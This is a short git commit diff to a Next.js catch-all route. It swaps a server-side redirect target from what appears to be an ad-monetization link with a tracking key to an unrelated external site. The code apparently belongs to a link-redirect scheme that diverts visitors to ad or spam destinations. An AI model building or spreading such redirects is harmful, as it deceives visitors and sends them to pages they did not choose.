dfe8e56233bde7e7576e332c95a0eb0701d573de
jannatunn760 <jannatunn760@gmail.com>
2024-11-16 19:54:01 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.profitablecpmrate.com/kv06fucssp?key=95c2497d10e2f737018c9de282a581d2`
+					`http://sport24.kesug.com/`
 				}`,
 			},
 		};
